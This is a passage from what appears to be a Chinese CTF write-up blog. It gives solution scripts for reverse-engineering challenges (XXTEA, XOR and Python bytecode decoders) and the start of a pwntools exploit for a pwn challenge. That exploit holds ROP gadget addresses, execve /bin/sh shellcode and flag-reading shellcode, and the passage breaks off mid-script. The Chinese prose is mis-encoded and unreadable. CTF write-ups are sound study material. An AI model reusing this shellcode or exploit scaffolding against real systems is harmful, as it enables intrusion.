            <span class="token keyword">for</span> <span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">&lt;</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>  
            <span class="token punctuation">&#123;</span>  
                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
                z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>  
            <span class="token punctuation">&#125;</span>  
            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
            z <span class="token operator">=</span> v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>  
        <span class="token punctuation">&#125;</span>  
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">&#125;</span>  
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token comment">/* Decoding Part */</span>  
    <span class="token punctuation">&#123;</span>  
        n <span class="token operator">=</span> <span class="token operator">-</span>n<span class="token punctuation">;</span>  
        rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span><span class="token operator">/</span>n<span class="token punctuation">;</span>  
        sum <span class="token operator">=</span> rounds<span class="token operator">*</span>DELTA<span class="token punctuation">;</span>  
        y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
        <span class="token keyword">do</span>  
        <span class="token punctuation">&#123;</span>  
            e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>  
            <span class="token keyword">for</span> <span class="token punctuation">(</span>p<span class="token operator">=</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> p<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span>  
            <span class="token punctuation">&#123;</span>  
                z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>  
            <span class="token punctuation">&#125;</span>  
            z <span class="token operator">=</span> v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>  
            sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>  
        <span class="token punctuation">&#125;</span>  
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span>  
  
  
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  
<span class="token punctuation">&#123;</span>  
    <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xE74EB323</span><span class="token punctuation">,</span><span class="token number">0xB7A72836</span><span class="token punctuation">,</span><span class="token number">0x59CA6FE2</span><span class="token punctuation">,</span><span class="token number">0x967CC5C1</span><span class="token punctuation">,</span>
                <span class="token number">0xE7802674</span><span class="token punctuation">,</span><span class="token number">0x3D2D54E6</span><span class="token punctuation">,</span><span class="token number">0x8A9D0356</span><span class="token punctuation">,</span><span class="token number">0x99DCC39C</span><span class="token punctuation">,</span>
                <span class="token number">0x7026D8ED</span><span class="token punctuation">,</span><span class="token number">0x6A33FDAD</span><span class="token punctuation">,</span><span class="token number">0xF496550A</span><span class="token punctuation">,</span><span class="token number">0x5C9C6F9E</span><span class="token punctuation">,</span>
                <span class="token number">0x1BE5D04C</span><span class="token punctuation">,</span><span class="token number">0x6723AE17</span><span class="token punctuation">,</span><span class="token number">0x5270A5C2</span><span class="token punctuation">,</span><span class="token number">0xAC42130A</span><span class="token punctuation">,</span>
                <span class="token number">0x84BE67B2</span><span class="token punctuation">,</span><span class="token number">0x705CC779</span><span class="token punctuation">,</span><span class="token number">0x5C513D98</span><span class="token punctuation">,</span><span class="token number">0xFB36DA2D</span><span class="token punctuation">,</span>
                <span class="token number">0x22179645</span><span class="token punctuation">,</span><span class="token number">0x5CE3529D</span><span class="token punctuation">,</span><span class="token number">0xD189E1FB</span><span class="token punctuation">,</span><span class="token number">0xE85BD489</span><span class="token punctuation">,</span>
                <span class="token number">0x73C8D11F</span><span class="token punctuation">,</span><span class="token number">0x54B5C196</span><span class="token punctuation">,</span><span class="token number">0xB67CB490</span><span class="token punctuation">,</span><span class="token number">0x2117E4CA</span><span class="token punctuation">,</span>
                <span class="token number">0x9DE3F994</span><span class="token punctuation">,</span><span class="token number">0x2F5AA1AA</span><span class="token punctuation">,</span><span class="token number">0xA7E801FD</span><span class="token punctuation">,</span><span class="token number">0xC30D6EAB</span><span class="token punctuation">,</span>
                <span class="token number">0x1BADDC9C</span><span class="token punctuation">,</span><span class="token number">0x3453B04A</span><span class="token punctuation">,</span><span class="token number">0x92A406F9</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> <span class="token keyword">const</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  
    <span class="token keyword">int</span> n<span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span> <span class="token comment">//nçš„ç»å¯¹å€¼è¡¨ç¤ºvçš„é•¿åº¦ï¼Œå–æ­£è¡¨ç¤ºåŠ å¯†ï¼Œå–è´Ÿè¡¨ç¤ºè§£å¯†  </span>
            <span class="token comment">// vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•°  </span>
            <span class="token comment">// kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½    </span>

    <span class="token function">btea</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token operator">-</span>n<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">35</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  
<span class="token punctuation">&#125;</span>  

<span class="token comment">// 23 B3 4E E7 36 28 A7 B7  E2 6F CA 59 C1 C5 7C 96</span>
<span class="token number">0xE7</span> <span class="token number">4</span>E B3 <span class="token number">23</span><span class="token punctuation">,</span><span class="token number">0xB7</span> A7 <span class="token number">28</span> <span class="token number">36</span><span class="token punctuation">,</span><span class="token number">0x59</span> CA <span class="token number">6F</span> E2<span class="token punctuation">,</span><span class="token number">0x96</span> <span class="token number">7</span>C C5 C1
<span class="token comment">// 74 26 80 E7 E6 54 2D 3D  56 03 9D 8A 9C C3 DC 99</span>
<span class="token number">0xE7</span> <span class="token number">80</span> <span class="token number">26</span> <span class="token number">74</span><span class="token punctuation">,</span><span class="token number">0x3D</span> <span class="token number">2</span>D <span class="token number">54</span> E6<span class="token punctuation">,</span><span class="token number">0x8A9D0356</span><span class="token punctuation">,</span><span class="token number">0x99</span> DC C3 <span class="token number">9</span>C<span class="token punctuation">,</span>
<span class="token comment">// ED D8 26 70 AD FD 33 6A  0A 55 96 F4 9E 6F 9C 5C</span>
<span class="token number">0x70</span> <span class="token number">25</span> D8 ED<span class="token punctuation">,</span><span class="token number">0x6A</span> <span class="token number">33</span> FD AD<span class="token punctuation">,</span><span class="token number">0xF4</span> <span class="token number">96</span> <span class="token number">55</span> <span class="token number">0</span>A<span class="token punctuation">,</span><span class="token number">0x5C9C6F9E</span><span class="token punctuation">,</span>
<span class="token comment">// 4C D0 E5 1B 17 AE 23 67  C2 A5 70 52 0A 13 42 AC</span>
<span class="token number">0x1B</span> E5 D0 <span class="token number">4</span>C<span class="token punctuation">,</span><span class="token number">0x67</span> <span class="token number">23</span> AE <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">0x52</span> <span class="token number">70</span> A5 C2<span class="token punctuation">,</span><span class="token number">0xAC</span> <span class="token number">42</span> <span class="token number">13</span> <span class="token number">0</span>A<span class="token punctuation">,</span>
<span class="token comment">// B2 67 BE 84 79 C7 5C 70  98 3D 51 5C 2D DA 36 FB</span>
<span class="token number">0x84</span> BE <span class="token number">67</span> B2<span class="token punctuation">,</span><span class="token number">0x70</span> <span class="token number">5</span>C C7 <span class="token number">79</span><span class="token punctuation">,</span><span class="token number">0x5C</span> <span class="token number">51</span> <span class="token number">3</span>D <span class="token number">98</span><span class="token punctuation">,</span><span class="token number">0xFB36DA2D</span><span class="token punctuation">,</span>
<span class="token comment">// 45 96 17 22 9D 52 E3 5C  FB E1 89 D1 89 D4 5B E8</span>
<span class="token number">0x22</span> <span class="token number">17</span> <span class="token number">96</span> <span class="token number">45</span><span class="token punctuation">,</span><span class="token number">0x5C</span> E3 <span class="token number">52</span> <span class="token number">9</span>D<span class="token punctuation">,</span><span class="token number">0xD1</span> <span class="token number">89</span> E1 FB<span class="token punctuation">,</span><span class="token number">0xE8</span> <span class="token number">5</span>B D4 <span class="token number">89</span>
<span class="token comment">// 1F D1 C8 73 96 C1 B5 54  90 B4 7C B6 CA E4 17 21</span>
<span class="token number">0x73</span> C8 D1 <span class="token number">1F</span><span class="token punctuation">,</span><span class="token number">0x54</span> B5 C1 <span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0xB6</span> <span class="token number">7</span>C B4 <span class="token number">90</span><span class="token punctuation">,</span><span class="token number">0x21</span> <span class="token number">17</span> E4 CA<span class="token punctuation">,</span>
<span class="token comment">// 94 F9 E3 9D AA A1 5A 2F  FD 01 E8 A7 AB 6E 0D C3</span>
<span class="token number">0x9D</span> E3 F9 <span class="token number">94</span><span class="token punctuation">,</span><span class="token number">0x2F</span> <span class="token number">5</span>A A1 AA<span class="token punctuation">,</span><span class="token number">0xA7</span> E8 <span class="token number">01</span> FD<span class="token punctuation">,</span><span class="token number">0xC3</span> <span class="token number">0</span>D <span class="token number">6</span>E AB
<span class="token comment">// 9C DC AD 1B 4A B0 53 34  F9 06 A4 92</span>
 <span class="token number">0x1B</span> AD DC <span class="token number">9</span>C<span class="token punctuation">,</span><span class="token number">0x34</span> <span class="token number">53</span> B0 <span class="token number">4</span>A<span class="token punctuation">,</span><span class="token number">0x92</span> A4 <span class="token number">06</span> F9<span class="token punctuation">&#125;</span>

<span class="token comment">// uint64_t a[35] = &#123;0xE74EB323,0xB7A72836,0x59CA6FE2,0x967CC5C1,</span>
<span class="token comment">//                 0xE7802674,0x3D2D54E6,0x8A9D0356,0x99DCC39C,</span>
<span class="token comment">//                 0x7026D8ED,0x6A33FDAD,0xF496550A,0x5C9C6F9E,</span>
<span class="token comment">//                 0x1BE5D04C,0x6723AE17,0x5270A5C2,0xAC42130A,</span>
<span class="token comment">//                 0x84BE67B2,0x705CC779,0x5C513D98,0xFB36DA2D,</span>
<span class="token comment">//                 0x22179645,0x5CE3529D,0xD189E1FB,0xE85BD489</span>
<span class="token comment">//                 0x73C8D11F,0x54B5C196,0xB67CB490,0x2117E4CA,</span>
<span class="token comment">//                 0x9DE3F994,0x2F5AA1AA,0xA7E801FD,0xC30D6EAB</span>
<span class="token comment">//                 0x1BADDC9C,0x3453B01B,0x92A406F9&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h4><p>è¿™é¢˜ç›®çš„å¹²æ‰°ä¿¡æ¯æ¯”è¾ƒå¤šï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªblockï¼Œæˆ‘è¿˜åœ¨æƒ³æ˜¯å¦æœ‰åŠ å¯†ï¼Œç„¶åå®ƒé‡Œé¢çš„å†™æ³•ä¹Ÿå¾ˆç¥å¥‡ï¼Œä»åå¾€å‰çœ‹çš„æ—¶å€™æˆ‘æ‰æ‰¾åˆ°å…³é”®çš„éªŒè¯å‚æ•°ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/welcome.jpg" alt="img"></p>
<p>ä¸Šè„šæœ¬ï¼š</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">uint8_t</span> temp <span class="token operator">=</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> a<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span>
                     <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span>
                     <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span><span class="token number">0xAE</span><span class="token punctuation">,</span>
                     <span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0x8F</span><span class="token punctuation">,</span><span class="token number">0x94</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span>
                     <span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0x97</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">22</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^=</span>temp<span class="token operator">--</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="pycï¼Œæ—¶éš”ä¸€å¹´ï¼Œè¿™æ¬¡è‚äº†ä¸€ä¸‹ææ˜ç™½äº†"><a href="#pycï¼Œæ—¶éš”ä¸€å¹´ï¼Œè¿™æ¬¡è‚äº†ä¸€ä¸‹ææ˜ç™½äº†" class="headerlink" title="pycï¼Œæ—¶éš”ä¸€å¹´ï¼Œè¿™æ¬¡è‚äº†ä¸€ä¸‹ææ˜ç™½äº†"></a>pycï¼Œæ—¶éš”ä¸€å¹´ï¼Œè¿™æ¬¡è‚äº†ä¸€ä¸‹ææ˜ç™½äº†</h3><p>ç›´æ¥ä¸Šè„šæœ¬ï¼</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> dis

<span class="token keyword">def</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    raw_flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'give me your flag:\n'</span><span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>raw_flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span>
        

    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>i<span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'your flag: '</span><span class="token operator">+</span>res<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    cipher <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    res <span class="token operator">=</span> <span class="token string">'30466633346f59213b4139794520572b45514d61583151576638643a'</span>
    res <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i  <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        cipher<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>

decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#dis.dis(fun)</span>

<span class="token comment"># SLICE+0()</span>
<span class="token comment"># Implements TOS = TOS[:].</span>
 
<span class="token comment"># SLICE+1()</span>
<span class="token comment"># Implements TOS = TOS1[TOS:].</span>
 
<span class="token comment"># SLICE+2()</span>
<span class="token comment"># Implements TOS = TOS1[:TOS].</span>
 
<span class="token comment"># SLICE+3()</span>
<span class="token comment"># Implements TOS = TOS2[TOS1:TOS].</span>

<span class="token comment"># Since Python 3.5 this is finally no longer awkward:</span>

<span class="token comment"># >>> b'\xde\xad\xbe\xef'.hex()</span>
<span class="token comment"># 'deadbeef'</span>
<span class="token comment"># and reverse:</span>

<span class="token comment"># >>> bytes.fromhex('deadbeef')</span>
<span class="token comment"># b'\xde\xad\xbe\xef'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h4 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h4><p>é€åˆ†é¢˜æˆ‘çš„æœ€çˆ±</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"password:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token string">"paSsw0rd"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//Do you know strcmp?</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you are right!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sorry, you are wrong.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>æ‰¾åˆ°å¸¸å­—ç¬¦ä¸²çš„åœ°å€æ³¨æ„ä¸€ä¸‹ç«¯åºï¼Œè¾“å…¥ï¼Œå¾—åˆ°flagã€‚</p>
<h4 id="letter"><a href="#letter" class="headerlink" title="letter"></a>letter</h4><p>ä¸­é—´è¯•äº†å¥½å¤šshellcodeï¼Œç»“æœæ˜¯æ”¾åœ¨æ²™ç®±é‡Œé¢çš„233ï¼Œæˆ‘å½“åœºæš´æ¯™ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment">#io = process("./letter")</span>
<span class="token comment">#gdb.attach(io)</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'182.92.108.71'</span><span class="token punctuation">,</span><span class="token number">31305</span><span class="token punctuation">)</span>

<span class="token comment">#0x0000000000400aa1 : pop rsi ; pop r15 ; ret</span>
<span class="token comment">#0x0000000000400a9d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span>
<span class="token comment">#0x0000000000400aa3 : pop rdi ; rttet</span>


<span class="token comment">#shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span>

<span class="token comment">#shellcode = "\x01\x30\x8f\xe2" + "\x13\xff\x2f\xe1" + "\x78\x46\x0e\x30" +  "\x01\x90\x49\x1a" + "\x92\x1a\x08\x27" +  "\xc2\x51\x03\x37" + "\x01\xdf\x2f\x62" +  "\x69\x6e\x2f\x2f" + "\x73\x68";</span>

<span class="token comment">#shellcode = shellcraft.amd64.linux.sh()</span>
<span class="token comment">#shellcode = "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00"</span>
<span class="token comment">#context(log_level="info", os="linux", arch="amd64")</span>
<span class="token comment">#shellcode_1 = shellcraft.open("./flag")</span>
<span class="token comment">#shellcode_2 = shellcraft.read("rax","rsp",100)</span>
<span class="token comment">#shellcode_2 += shellcraft.write(1,"rsp",100)</span>
<span class="token comment">#shellcode = asm(shellcode)</span>

shellcode_1 <span class="token operator">=</span> <span class="token string">b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8/.gm`f\x01\x01H1\x04$H\x89\xe71\xd21\xf6'</span>
shellcode_2 <span class="token operator">=</span> <span class="token string">b'j\x02X\x0f\x05H\x89\xc71\xc0jdZH\x89\xe6\x0f\x05j\x01_jdZH\x89\xe6j\x01X\x0f\x05'</span>


ch_rsi_address <span class="token operator">=</span> <span class="token number">0x400aa1</span>
ch_rdi_address <span class="token operator">=</span> <span class="token number">0x400aa3</span>
read_address   <span class="token operator">=</span> <span class="token number">0x400730</span>
get_shell_address      <span class="token operator">=</span> <span class="token number">0x601500</span>
payload_1      <span class="token operator">=</span> <span class="token string">'-1'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">14</span>
